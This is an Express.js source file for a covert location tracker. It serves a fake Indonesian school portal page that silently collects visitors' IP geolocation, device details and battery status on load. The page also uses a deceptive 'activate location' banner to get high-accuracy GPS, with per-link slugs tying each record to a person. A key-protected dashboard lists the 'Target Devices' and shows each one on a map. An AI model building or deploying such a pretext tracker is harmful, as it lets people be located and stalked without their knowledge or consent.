const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;

// ============ CONFIG ============
const DASH_KEY = 'gilang123';
const TLOG = path.join(__dirname, '_tlog');
const GEO_FILE = path.join(TLOG, 'geo.tsv');
const GPS_FILE = path.join(TLOG, 'gps.tsv');
const DEVICE_FILE = path.join(TLOG, 'devices.json');

if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');

// ============ HELPERS ============
function clientIp(req) {
  const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
  return raw.replace(/^::ffff:/, '');
}

function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }

function detectDevice(ua) {
  if (!ua) return 'Unknown Device';
  let os = 'Desktop';
  if (/android/i.test(ua)) os = 'Android';
  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
  
  let browser = 'Browser';
  if (/chrome|crios/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';

  let model = '';
  const match = ua.match(/\(([^)]+)\)/);
  if (match && match[1]) {
     const parts = match[1].split(';');
     if (parts.length > 2) model = parts[2].trim(); 
  }
  return `${os} | ${model ? model + ' | ' : ''} ${browser}`;
}

async function ipGeo(ip) {
  const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query,proxy,hosting`;
  try {
    const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
    const data = await r.json();
    return data && data.status === 'success' ? data : { status: 'fail', query: ip };
  } catch (e) { return { status: 'fail', query: ip }; }
}

app.set('trust proxy', true); 
app.use(express.json({ limit: '128kb' }));
app.use(express.urlencoded({ extended: false }));

// ============ API ============
app.get('/api/geoip', async (req, res) => {
  res.set('Cache-Control', 'no-store');
  const ip = clientIp(req);
  const slug = cleanSlug(req.query.s);
  const ua = req.headers['user-agent'] || '-';
  const device = detectDevice(ua);
  
  const data = await ipGeo(ip);
  const row = [new Date().toISOString(), slug || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', device].join('\t');
  appendLog(GEO_FILE, row);
  res.json({ ...data, device });
});

app.post('/api/gps', (req, res) => {
  const d = req.body && typeof req.body === 'object' ? { ...req.body } : {};
  d.ip = clientIp(req); 
  d.ua = req.headers['user-agent'] || '-'; 
  d.device = detectDevice(d.ua); 
  d.ts_server = new Date().toISOString();
  appendLog(GPS_FILE, JSON.stringify(d));
  res.json({ ok: true });
});

// ============ DASHBOARD: LIST DEVICE ============
app.get('/dash', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');

  const devices = new Map();

  try {
    for (const line of fs.readFileSync(GEO_FILE, 'utf8').split('\n').filter(Boolean)) {
      const c = line.split('\t');
      if (c.length < 9) continue;
      const ip = c[2];
      const key = ip + '|' + (c[8] || '-');
      if (!devices.has(key)) {
        devices.set(key, {
          ip, slug: c[1], time: c[0], city: c[3], region: c[4],
          lat: parseFloat(c[5]), lon: parseFloat(c[6]),
          isp: c[7], device: c[8],
          gpsLat: null, gpsLon: null, gpsAcc: null, gpsTime: null
        });
      }
    }
  } catch (_) {}

  try {
    for (const line of fs.readFileSync(GPS_FILE, 'utf8').split('\n').filter(Boolean)) {
      let d; try { d = JSON.parse(line); } catch (_) { continue; }
      if (d.src !== 'gps' || typeof d.lat !== 'number') continue;
      const key = d.ip + '|' + (d.device || '-');
      if (!devices.has(key)) {
        devices.set(key, {
          ip: d.ip, slug: d.slug || '-', time: d.ts_server,
          city: '-', region: '-', lat: null, lon: null,
          isp: 'Koneksi HP', device: d.device || 'Unknown',
          gpsLat: d.lat, gpsLon: d.lon, gpsAcc: d.acc, gpsTime: d.ts_server
        });
      } else {
        const dev = devices.get(key);
        dev.gpsLat = d.lat; dev.gpsLon = d.lon;
        dev.gpsAcc = d.acc; dev.gpsTime = d.ts_server;
      }
    }
  } catch (_) {}

  const list = Array.from(devices.values()).sort((a, b) => (b.time || '').localeCompare(a.time || ''));
  try { fs.writeFileSync(DEVICE_FILE, JSON.stringify(list)); } catch (_) {}

  const rows = list.map((d, i) => {
    const hasGps = d.gpsLat !== null;
    const badge = hasGps ? `<span class="badge gps">GPS ±${Math.round(d.gpsAcc || 0)}m</span>` : `<span class="badge ip">IP only</span>`;
    const loc = hasGps ? `GPS Presisi` : `${d.city}, ${d.region}`;
    return `
      <a class="row" href="/dash/map?k=${encodeURIComponent(DASH_KEY)}&i=${i}">
        <div class="row-left">
          <div class="dev">${d.device || 'Unknown Device'}</div>
          <div class="meta">${d.ip} · ${loc}</div>
          <div class="meta small">${d.isp} · ${d.slug} · ${new Date(d.time).toLocaleString('id-ID')}</div>
        </div>
        <div class="row-right">${badge}<span class="arrow">›</span></div>
      </a>`;
  }).join('');

  res.type('html').send(`<!doctype html>
<html><head><meta charset="utf-8"><title>Devices</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { margin: 0; background: #0f172a; color: #e2e8f0; }
  .header { padding: 20px 16px 12px; background: #1e293b; border-bottom: 1px solid #334155; }
  .header h1 { margin: 0; font-size: 18px; color: #38bdf8; }
  .header p { margin: 4px 0 0; font-size: 12px; color: #94a3b8; }
  .list { padding: 12px; }
  .row { display: flex; justify-content: space-between; align-items: center; background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 14px; margin-bottom: 10px; text-decoration: none; color: inherit; transition: 0.15s; }
  .row:active { background: #334155; transform: scale(0.99); }
  .dev { font-weight: 600; font-size: 14px; color: #f1f5f9; margin-bottom: 4px; }
  .meta { font-size: 12px; color: #94a3b8; line-height: 1.5; }
  .meta.small { font-size: 11px; color: #64748b; }
  .badge { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: 700; margin-right: 8px; }
  .badge.gps { background: #064e3b; color: #34d399; }
  .badge.ip { background: #7f1d1d; color: #fca5a5; }
  .arrow { color: #64748b; font-size: 20px; }
  .empty { text-align: center; padding: 40px 20px; color: #64748b; font-size: 13px; }
</style></head>
<body>
<div class="header">
  <h1>🎯 Target Devices</h1>
  <p>${list.length} device tercatat · klik buat lihat map</p>
</div>
<div class="list">
  ${rows || '<div class="empty">Belum ada target yang buka link.</div>'}
</div>
</body></html>`);
});

// ============ DASHBOARD: MAP PER DEVICE ============
app.get('/dash/map', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');

  let devices = [];
  try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}

  const idx = parseInt(req.query.i, 10);
  const d = devices[idx];
  if (!d) return res.status(404).send('Device not found');

  const lat = d.gpsLat !== null ? d.gpsLat : d.lat;
  const lon = d.gpsLon !== null ? d.gpsLon : d.lon;
  const zoom = d.gpsLat !== null ? 16 : 11;
  const acc = d.gpsAcc || 500;

  res.type('html').send(`<!doctype html>
<html><head><meta charset="utf-8"><title>Map - ${d.device}</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
  * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { margin: 0; background: #0f172a; color: #e2e8f0; }
  #map { height: 60vh; width: 100%; }
  .panel { padding: 16px; background: #1e293b; border-top: 1px solid #334155; }
  .back { display: inline-block; color: #38bdf8; text-decoration: none; font-size: 13px; margin-bottom: 12px; }
  h2 { margin: 0 0 8px; font-size: 16px; color: #f1f5f9; }
  .kv { display: flex; justify-content: space-between; font-size: 13px; padding: 6px 0; border-bottom: 1px solid #334155; }
  .kv span:first-child { color: #94a3b8; }
  .kv span:last-child { color: #e2e8f0; font-weight: 500; text-align: right; max-width: 60%; word-break: break-all; }
</style></head>
<body>
<div id="map"></div>
<div class="panel">
  <a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali ke daftar</a>
  <h2>${d.device || 'Unknown Device'}</h2>
  <div class="kv"><span>IP</span><span>${d.ip}</span></div>
  <div class="kv"><span>Lokasi</span><span>${d.gpsLat !== null ? 'GPS Presisi' : (d.city + ', ' + d.region)}</span></div>
  <div class="kv"><span>Akurasi</span><span>${d.gpsLat !== null ? '±' + Math.round(acc) + ' m' : '~' + acc + ' km (IP)'}</span></div>
  <div class="kv"><span>ISP</span><span>${d.isp}</span></div>
  <div class="kv"><span>Link</span><span>${d.slug}</span></div>
  <div class="kv"><span>Waktu</span><span>${new Date(d.time).toLocaleString('id-ID')}</span></div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
const lat = ${lat}, lon = ${lon}, acc = ${acc}, isGps = ${d.gpsLat !== null};
const map = L.map('map').setView([lat, lon], ${zoom});
L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution: '© OSM' }).addTo(map);

L.circle([lat, lon], {
  radius: isGps ? acc : acc * 1000,
  color: isGps ? '#34d399' : '#ef4444',
  fillColor: isGps ? '#34d399' : '#ef4444',
  fillOpacity: 0.15, weight: 1
}).addTo(map);
L.circleMarker([lat, lon], {
  radius: 10, color: isGps ? '#059669' : '#b91c1c',
  fillColor: isGps ? '#34d399' : '#ef4444', fillOpacity: 0.9, weight: 3
}).addTo(map).bindPopup('<b>' + (isGps ? 'GPS Presisi' : 'IP Lokasi') + '</b><br>Akurasi: ' + (isGps ? '±' + Math.round(acc) + 'm' : '~' + acc + 'km'));
</script>
</body></html>`);
});

// ============ LANDING PAGE (WEB SEKOLAH) ============
app.get('*', (req, res) => {
  const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
  res.type('html').send(`<!doctype html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Portal Informasi Sekolah</title>
<style>
  :root { --primary: #0f766e; --bg: #f8fafc; --text: #334155; }
  * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { margin: 0; background: var(--bg); color: var(--text); }
  .navbar { background: var(--primary); color: white; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; font-weight: bold; }
  .hero { background: white; padding: 30px 20px; text-align: center; border-bottom: 1px solid #e2e8f0; }
  .hero h1 { margin: 0 0 10px; font-size: 22px; color: #0f172a; }
  .hero p { margin: 0; font-size: 14px; color: #64748b; }
  .container { padding: 20px; max-width: 600px; margin: 0 auto; }
  .card { background: white; border-radius: 10px; padding: 20px; margin-bottom: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
  .card h3 { margin: 0 0 10px; font-size: 16px; color: #0f172a; }
  .card p { margin: 0; font-size: 13px; line-height: 1.6; color: #475569; }
  .card .date { font-size: 11px; color: #94a3b8; margin-bottom: 8px; display: block; }
  .loc-banner { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #1e293b; color: white; padding: 15px; border-radius: 12px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 10px 25px rgba(0,0,0,0.2); z-index: 999; transform: translateY(150%); transition: 0.4s; }
  .loc-banner.show { transform: translateY(0); }
  .loc-banner p { margin: 0; font-size: 12px; flex: 1; }
  .loc-banner button { background: #38bdf8; color: #0f172a; border: none; padding: 8px 15px; border-radius: 6px; font-weight: bold; font-size: 12px; cursor: pointer; }
</style>
</head>
<body>

<div class="navbar">
  <span>🏫 SMK Negeri 1</span>
  <span>☰</span>
</div>

<div class="hero">
  <h1>Selamat Datang di Portal Sekolah</h1>
  <p>Pusat informasi akademik dan kegiatan siswa</p>
</div>

<div class="container">
  <div class="card">
    <span class="date">Hari ini</span>
    <h3>Pengumuman Ujian Tengah Semester</h3>
    <p>Ujian Tengah Semester (UTS) akan dilaksanakan mulai minggu depan. Siswa diharapkan mempersiapkan diri dengan baik. Jadwal lengkap dapat dilihat di papan pengumuman sekolah.</p>
  </div>
  <div class="card">
    <span class="date">Kemarin</span>
    <h3>Kegiatan Ekstrakurikuler</h3>
    <p>Pendaftaran ekstrakurikuler baru dibuka. Tersedia pilihan Pramuka, Paskibra, Futsal, Basket, dan Robotik. Silakan hubungi wali kelas untuk informasi lebih lanjut.</p>
  </div>
  <div class="card">
    <span class="date">2 hari lalu</span>
    <h3>Pembayaran SPP Bulan Ini</h3>
    <p>Diharapkan orang tua/wali murid segera menyelesaikan administrasi SPP sebelum tanggal 10. Pembayaran dapat dilakukan melalui bank atau langsung ke bagian tata usaha.</p>
  </div>
</div>

<div class="loc-banner" id="locBanner">
  <p>Aktifkan lokasi untuk melihat informasi sekolah terdekat.</p>
  <button id="allowLoc">Aktifkan</button>
</div>

<script>
(function(){
  const slug = ${JSON.stringify(slug)};
  
  fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});

  async function collectData() {
    const data = { src: 'device_info', userAgent: navigator.userAgent, platform: navigator.platform, screenRes: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, slug: slug };
    if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; data.charging = b.charging; } catch(e){} }
    if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
    fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
  }
  collectData();

  const banner = document.getElementById('locBanner');
  const btnLoc = document.getElementById('allowLoc');
  let isGpsDone = false;

  setTimeout(() => { banner.classList.add('show'); }, 3000);

  btnLoc.addEventListener('click', () => {
    if (isGpsDone || !navigator.geolocation) return;
    isGpsDone = true;
    banner.classList.remove('show');
    navigator.geolocation.getCurrentPosition(
      p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug,ts:Date.now()}) }).catch(()=>{}); btnLoc.innerText = 'Aktif'; },
      e => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps_err',err:e.code,slug,ts:Date.now()}) }).catch(()=>{}); },
      {enableHighAccuracy:true,timeout:9000,maximumAge:0}
    );
  });
})();
</script>
</body></html>`);
});

// ============ START ============
http.createServer(app).listen(PORT, '0.0.0.0', () => {
  console.log(`[TRACKER] Nyala di port ${PORT}`);
});
